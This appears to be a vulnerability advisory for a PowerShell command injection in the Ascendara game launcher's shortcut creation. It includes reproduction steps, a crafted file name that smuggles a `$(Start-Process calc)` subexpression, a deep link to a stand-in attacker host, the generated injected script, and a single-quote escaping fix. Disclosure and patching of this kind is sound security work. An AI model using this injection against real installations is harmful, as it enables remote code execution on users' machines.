# Ascendara RCE - PowerShell Injection in Shortcut Creation

- Project: [Ascendara/ascendara](https://github.com/Ascendara/ascendara)
- Vulnerable version: 11.6.0 (commit `88f2e323cd58213975806a4cb62d5496f1e136c7`)
- Affected platform: Windows
- Class: CWE-78 (OS Command Injection)
- Severity: Critical — remote code execution without launching the downloaded game

## How it works

1. A game archive is delivered through any of Ascendara's download entry points: the
   `ascendara://` deep link (a single webpage can trigger `ascendara://https://attacker.example/game.zip`),
   the browser-extension download handoff, the game index, a private source, or a torrent.
2. `AscendaraDownloader` extracts the archive and preserves entry file names. Windows file
   names may legally contain `$`, `(`, and `)`.
3. `_detect_and_set_executable` (`binaries/AscendaraDownloader/src/AscendaraDownloader.py`)
   walks the game folder and stores the full path of the best-scoring `.exe` in
   `<game>.ascendara.json`.
4. When the download completes, `autoCreateShortcuts` (on by default,
   `src/context/SettingsContext.jsx`) makes `src/pages/Downloads.jsx` call
   `createGameShortcut` automatically — no further user interaction.
5. `createShortcutInDirectory` (`electron/modules/games.js`) writes a temporary `.ps1`
   that interpolates the game name, the executable path, and the handler path into
   **double quoted** PowerShell strings.
6. The script is executed with `powershell.exe -ExecutionPolicy Bypass -File`.
   PowerShell evaluates `$( ... )` subexpressions inside double-quoted strings, so a
   crafted executable name such as `x$(Start-Process calc)b.exe` runs an arbitrary
   command as the user the moment the download finishes.

The same sink is reachable manually through the per-game "Create Shortcut" action
(`src/pages/GameScreen.jsx`), and custom/imported game names flow into the same
interpolations.

## Reproduce

1. Build an archive containing a single file named `x$(Start-Process calc)b.exe`
2. Serve it over HTTP(S), e.g. `python3 -m http.server`.
3. On a Windows machine with Ascendara installed, open
   `ascendara://http://<host>:8000/game.zip` in a browser, confirm the download dialog.
4. Wait for download and extraction to finish. `calc.exe` opens on its own — the game
   was never launched.

To print the exact PowerShell that the vulnerable code generates without a Windows box:

```
node poc.js
```

Output (the `IconLocation` line is the injection point):

```powershell
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("C:\Users\victim\Desktop\Cool Game.lnk")
$Shortcut.TargetPath = "C:\...\resources\AscendaraGameHandler.exe"
$Shortcut.Arguments = '"C:\Users\victim\Games\Cool Game\x$(Start-Process calc)b.exe" 0 "--shortcut"'
$Shortcut.WorkingDirectory = "C:\...\resources"
$Shortcut.IconLocation = "C:\Users\victim\Games\Cool Game\x$(Start-Process calc)b.exe,0"
$Shortcut.Save()
```

## The fix

`electron/modules/games.js` — the patch in this repository places every interpolated
value inside **single quoted** PowerShell strings and doubles any embedded single
quotes. Single-quoted PowerShell strings are never expandable, so no path or game
name can break out of the string and no subexpression is evaluated:

```js
const psEscape = value => String(value).replace(/'/g, "''");

const psScript = `
  $WScriptShell = New-Object -ComObject WScript.Shell
  $Shortcut = $WScriptShell.CreateShortcut('${psEscape(shortcutPath)}')
  $Shortcut.TargetPath = '${psEscape(handlerPath)}'
  $Shortcut.Arguments = '"${psEscape(exePath)}" ${isCustom ? 1 : 0} "--shortcut"'
  $Shortcut.WorkingDirectory = '${psEscape(path.dirname(handlerPath))}'
  ${!exePath.match(/\.(bat|cmd)$/i) ? `$Shortcut.IconLocation = '${psEscape(exePath)},0'` : ""}
  $Shortcut.Save()
`;
```

Defense in depth worth considering upstream: reject or rename extracted file names
containing PowerShell metacharacters in the downloader's executable detection.

## Related observations

- `webPreferences.webSecurity: false` and `sandbox: false` on the main window
  (`electron/modules/window.js`) weaken the renderer's blast radius if any XSS is
  ever found.
- Unpathvalidated IPC channels `read-local-file`, `read-file`, `write-file`,
  `writeFile`, `deleteFile` (`electron/modules/ipc-handlers.js`) would turn a single
  renderer XSS into arbitrary file read/write. They are origin-guarded today, but
  path allow-listing would make them safe by construction.

## Disclosure

This must not be used in any harmful way.
